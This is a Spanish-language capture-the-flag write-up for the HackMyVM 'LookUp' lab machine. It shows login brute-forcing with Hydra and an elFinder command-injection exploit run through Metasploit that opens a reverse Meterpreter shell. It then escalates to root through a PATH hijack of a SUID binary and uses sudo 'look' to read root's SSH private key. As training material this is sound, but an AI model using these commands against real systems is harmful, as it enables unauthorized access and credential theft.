# WriteUp: LookUp | HackMyVM

Iniciamos realizando un escaneo con Nmap

```bash
$ nmap -sV -sC -O 192.168.56.21

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:d3:b7:16:37:b3:6f:e2:a0:6e:d8:52:eb:50:1d:87 (RSA)
|   256 45:0e:e5:1a:90:83:3c:74:67:bd:f2:3f:54:0d:0b:86 (ECDSA)
|_  256 ec:0d:5a:40:2b:0b:fb:23:0c:f7:0e:f2:23:b9:43:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como podemos observar del escaneo, el puerto 80 nos está tratando de redireccionar a `http://lookup.thm`

Si nosotros tratamos de ingresar a la página web solo a través de la IP, está nos arrojará un error, es por ello que debemos de hacer una configuración. Debemos de configurar la redirección de IP al nombre del dominio en el archivo `/etc/hosts`.

Para esta configuración hacemos lo siguiente:
```bash
# Escribimos este comando
$ nano /etc/hosts

# Luego añadimos la redirección
192.168.56.21     http://lookup.thm
```

Una vez realizado esto, ingresamos a la plataforma y tendremos lo siguiente:

![](Pasted%20image%2020250923161306.png)

Lo siguiente que vamos a realizar es utilizar gobuster para enumerar directorios ocultos:

```bash
$ gobuster dir -u 192.168.56.21 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.21
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 0] [--> http://lookup.hmv]
/server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

Como podemos observar, no hay nada relevante.

Visualizamos qué sucede si ingresamos usuarios típicos en el formulario de registro:
- Username: admin
- Password: admin

```text
# Para este usuario nos aparece lo siguiente:

Wrong password. Please try again.
Redirecting in 3 seconds.

# Que traducido al español es:

Contraseña incorrecta. Por favor, inténtalo de nuevo. 
Redireccionando en 3 segundos.
```

Este mensaje nos da a suponer que el usuario `admin` existe, vamos a comprobar qué mensaje nos muestra si colocamos otro juego de usuarios.

- Username: hola
- Password: hola

```text
# Para este otro juego de usuario tenemos el siguiente mensaje:

Wrong username or password. Please try again.
Redirecting in 3 seconds.

# Que traducido al español es:

Nombre de usuario o contraseña incorrectos. Por favor, inténtalo de nuevo. 
Redireccionando en 3 segundos.

```

Por lo que esto confirma que el `Username: admin` sí existe.

Con esto podemos realizar un ataque de fuerza bruta para tratar de identificar la contraseña.

Para este caso utilizaremos Hydra para realizar la fuerza bruta:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password" -V
```

Luego de varios intentos y varios minutos, hydra nos muestra el siguiente resultado:

```bash
[RE-ATTEMPT] target http://lookup.thm - login "admin" - pass "punkin1" - 11800 of 14344404 [child 6] (0/5)
[RE-ATTEMPT] target http://lookup.thm - login "admin" - pass "peaches2" - 11800 of 14344404 [child 7] (0/5)
[RE-ATTEMPT] target http://lookup.thm - login "admin" - pass "miming" - 11800 of 14344406 [child 2] (0/7)
[RE-ATTEMPT] target http://lookup.thm - login "admin" - pass "me2you" - 11800 of 14344406 [child 8] (0/7)
 [80][http-post-form] host: 10.201.1.241   login: admin   password: ribeiro
```

Sin embargo, al aplicar estas credenciales en el formulario nos aparece el mensaje: 

```text
Wrong username or password. Please try again.
Redirecting in 3 seconds.
```

En este caso, como lo obtenido por hydra para la búsqueda del password no nos ayuda, podemos realizar lo mismo para encontrar algún otro `Username`.

Para este casi utilizaremos la `seclists`:

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p admin lookup.hmv http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong username or password"   
```

Obtenemos el siguiente resultado:

```bash
[80][http-post-form] host: lookup.hmv   login: admin   password: admin
[80][http-post-form] host: lookup.hmv   login: jose   password: admin
```

Como podemos observar, tenemos otro usuario llamado `jose`.

Podemos volver a aplicar fuerza bruta con Hydra para tratar de encontrar alguna contraseña para este usuario.

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.hmv http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password." -V
```

Luego de unos minutos obtenemos lo siguiente:

```bash
[ATTEMPT] target lookup.thm - login "jose" - pass "ecuador" - 1416 of 14344399 [child 8] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "hotpink" - 1417 of 14344399 [child 10] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "soulmate" - 1418 of 14344399 [child 0] (0/0)
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

Con esto ya nos podemos logear.

Sin embargo, cuando colocamos las credenciales obtenemos el siguiente mensaje:

```text
This site can’t be reached
files.lookup.thm’s DNS address could not be found. Diagnosing the problem.
DNS_PROBE_POSSIBLE
```

Por lo que recibimos otra redirección que debemos de colocar en nuestro archivo `/etc/hosts`

Una vez colocado la redirección, ingresamos a la plataforma:

![](Pasted%20image%2020250924155410.png)

Revisando todos los archivos he podido percatarme de que el archivo `credentials.txt` tiene justamente unas credenciales:

- `think : nopassword`

Lo guardaremos por si en algún momento lo necesitamos.

Luego de ello nos ponemos a investigar la información a cerca de la plataforma.

Nos percatamos de que está utilizando lo siguiente:

![](Pasted%20image%2020250924160049.png)

Realizando una búsqueda con `searchsploit`

```bash
$ searchsploit elFinder     
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                                                                            | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                  | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                          | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                  | php/webapps/51864.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Podemos observar que hay un exploit justa para la versión que necesitamos, por lo que vamos a ingresar a Metasploit.

Realizamos la búsqueda y encontramos:

```bash
msf > search elFinder PHP Connector < 2.1.48

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

```

Haciendo las configuraciones correspondiente:

```bash
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.hmv
RHOSTS => files.lookup.hmv

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 192.168.56.22
LHOST => 192.168.56.22

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run

[*] Started reverse TCP handler on 192.168.56.22:4444 
[*] Uploading payload 'zzRclDCn.jpg;echo 6370202e2e2f66696c65732f7a7a52636c44436e2e6a70672a6563686f2a202e4634577077472e706870 |xxd -r -p |sh& #.jpg' (1937 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.F4WpwG.php) ...
[*] Sending stage (40004 bytes) to 192.168.56.21
[+] Deleted .F4WpwG.php
[*] Meterpreter session 1 opened (192.168.56.22:4444 -> 192.168.56.21:38866) at 2025-09-24 16:09:50 -0500
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > getuid
Server username: www-data
```

El usuario `www-data` es el usuario por defecto que usan los servidores web (como Apache o Nginx) para ejecutar los procesos. Está diseñado para tener muy pocos privilegios por seguridad. El objetivo ahora es encontrar una vulnerabilidad o una mala configuración en el sistema para "saltar" de `www-data` a un usuario con más privilegios, idealmente `root`.

Antes de nada, debemos de pasar de una shell de Meterpreter a una shell interactiva completa (TTY), es mucho mejor para trabajar.

1. Dentro de Meterpreter, obtén una shell básica:
    
    ```sh
    shell
    ```
    
2. Una vez dentro de la shell del sistema (`/bin/sh`), mejórala a una shell `bash` interactiva usando Python (casi siempre está instalado):
    
    ```sh
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
    Cuando `python3` no funciona, podemos probar tambien con `python`.


Vamos a buscar permisos elevados. Iniciemos con este comando:

```sh
sudo -l
```

Sin embargo no aparece ninguna información relevate y solo nos pide contraseña.

Entonces, busca archivos que se ejecuten con los permisos del propietario (en este caso, `root`).

```sh
find / -perm -u=s -type f 2>/dev/null

# Respuesta:

/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

De toda esa lista, el archivo más sospechoso y que debemos de investigar es **`/usr/sbin/pwm`**.

La razón es simple: **no es un binario estándar de Linux**.

La mayoría de los otros archivos en esa lista (`sudo`, `passwd`, `su`, `mount`, `pkexec`, etc.) son utilidades del sistema operativo. Son SUID por diseño para permitir que usuarios normales realicen acciones privilegiadas de forma segura. 

Todo lo que está dentro de `/snap/` son binarios empaquetados y sandboxed. Puedes ignorarlos, ya que son parte del sistema de paquetes Snap y no suelen ser una vía de escalada.

`/usr/sbin/pwm` destaca porque es un programa desconocido.

Ejecutamos `/usr/sbin/pwm` y tenemos el siguiente resultado:

```sh
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

Que traducido al español sería:

```
[!] Ejecutando el comando 'id' para extraer el nombre de usuario y el identificador de usuario (UID)  
[!] ID: www-data  
[-] Archivo '/home/www-data/.passwords' no encontrado
```

El programa te está diciendo exactamente cómo es vulnerable: **ejecuta el comando `id` y luego intenta leer un archivo basado en el nombre de usuario que obtiene.**

La vulnerabilidad aquí es un clásico **Path Hijacking** (Secuestro de PATH). El programa `pwm`, que se ejecuta como `root`, está llamando al comando `id` sin usar su ruta absoluta (`/usr/bin/id`). Esto significa que podemos engañarlo para que ejecute _nuestro propio script_ llamado `id`.

Para esto vamos a crear un archivo llamado `id` en `/tmp`, debido a que tenemos permisos de escritura en esa carpeta:

```sh
# Ejecutamos ls -la en la raiz
...
dr-xr-xr-x  13 root root          0 Sep 25 16:06 sys
drwxrwxrwt   2 root root       4096 Sep 25 16:16 tmp
drwxr-xr-x  14 root root       4096 Feb 23  2022 usr
...
```

Para la creación del archivo ejecutamos lo siguiente:

```sh
echo -e '#!/bin/bash\necho "uid=33(think) gui=33(think) groups=33(think)"' > /tmp/id

# Luego le damos los permisos al archivo para sus ejecución

chmod +x /tmp/id
```

Una vez creado el lo archivo añadimos al `PATH`:
```sh
export PATH=/tmp:$PATH
```

Luego de esto, volvemos a ejecutar el comando:

```sh
/usr/sbin/pwm

# Resultado:

[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
...
```

Como podemos recodar, el comando `/usr/sbin/pwm` al ejecutarlo extraía las contraseñas del archivo `.passwords`.

Ahora que ya tenemos una lista de posibles contraseñas para el usuario `think`, podemos aplicar fuerza bruta para tratar de ingresar por `SSH`. 

Guardamos la lista en un archivo que se llame `credenciales.txt` y la pasamos por Hydra para verificar si podemos conectarnos:
```sh
hydra -l think -P /home/kali/credenciales.txt 192.168.56.21 ssh -s 22

# Resultado:
[22][ssh] host: 192.168.56.21   login: think   password: joXXXXXXXXXXXXXX
```

Ahora que ya tenemos la contraseña, podemos intentar el acceso:
```sh
ssh think@192.168.56.21
think@192.168.56.21's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 25 Sep 2025 04:47:52 PM UTC

  System load:  0.02              Processes:                198
  Usage of /:   58.7% of 9.75GB   Users logged in:          0
  Memory usage: 37%               IPv4 address for enp0s17: 192.168.56.21
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 24 17:04:49 2025 from 192.168.56.22

think@lookup:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

Y como podemos ver, tenemos acceso al usuario `think`.
 Ahora buscamos el archivo `usert.txt` para tener nuestra primera flag:

```sh
think@lookup:~$ ls
user.txt
think@lookup:~$ cat user.txt 
38XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Lo siguiente que vamos a hacer es buscar si podemos ejecutar algún comando como `root`:
```sh
sudo -l

# Resultado:

Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

Hacemos la búsqueda del comando `look` en [gtfobins](https://gtfobins.github.io/gtfobins/look/) y encontramos lo siguiente:

---
 **Sudo**

Si al binario se le permite ejecutarse como superusuario mediante `sudo`, este no descarta los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.

**Ejemplo:**

```bash
LFILE=archivo_a_leer
sudo look '' "$LFILE"
```

---

```text
Explicación

Este texto describe una técnica de **escalada de privilegios** en sistemas tipo Unix/Linux.

- Explica que si el comando `look` está configurado en el archivo `sudoers` para ser ejecutado por un usuario, este usuario puede abusar de ese permiso.
    
- El comando `look` se usa normalmente para buscar líneas en un archivo que comienzan con una cadena de texto.
    
- En el ejemplo, `sudo look '' "$LFILE"` se ejecuta con privilegios de superusuario. Se le pasa una cadena de búsqueda vacía (`''`) y el nombre de un archivo (`$LFILE`). Como el comando no pierde los privilegios de `sudo`, puede leer cualquier archivo del sistema, incluso aquellos que el usuario normalmente no podría ver (como `/etc/shadow`).
```

En base a esto, como podemos leer archivos con permisos `root`, podemos ingresar y leer `/root/.shh/id_rsa`, de esta manera tener su clave `rsa` y conectarnos a través de `SSH`:

```sh
sudo /usr/bin/look '' "/root/.ssh/id_rsa"

#Resultado:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
...
DgTNYOtefYf4OEpwAAABFyb290QHVidW50d
-----END OPENSSH PRIVATE KEY-----
```

Copiamos la clave y creamos un nuevo archivo `id_rsa` en el cual copiamos la clave extraída.

Luego de ello, le tenemos que configurar los permisos al archivo creado:
```sh
chmod 600 id_rsa
```

Recuerda que cambiar los permisos del archivo `id_rsa` a `600` es una **medida de seguridad obligatoria** impuesta por el propio cliente `SSH`. Si no lo hacemos, `SSH` se negará a usar la clave.

El archivo `id_rsa` es una **clave privada**, el equivalente a la llave maestra que te da acceso a servidores remotos sin necesidad de una contraseña. Debe ser secreta y accesible **únicamente por el usuario a quien le pertenece**.

Por esto, el comando `chmod` cambia los permisos de un archivo. El número `600` se descompone así:

- **`6` (Propietario):** El dueño del archivo tiene permisos de **leer (4) + escribir (2)**.
    
- **`0` (Grupo):** Los usuarios que pertenecen al mismo grupo que el archivo **no tienen ningún permiso**.
    
- **`0` (Otros):** El resto de los usuarios del sistema **no tienen ningún permiso**.

Luego de esto, ingresamos por `SSH`:

```sh
ssh -i id_rsa root@lookup.hmv

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 25 Sep 2025 05:12:41 PM UTC

  System load:  0.0               Processes:                200
  Usage of /:   58.7% of 9.75GB   Users logged in:          1
  Memory usage: 38%               IPv4 address for enp0s17: 192.168.56.21
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep 24 17:22:12 2025 from 192.168.56.22
root@lookup:~$ 
```

Ahora que obtuvimos acceso `root`, podemos leer la flag final.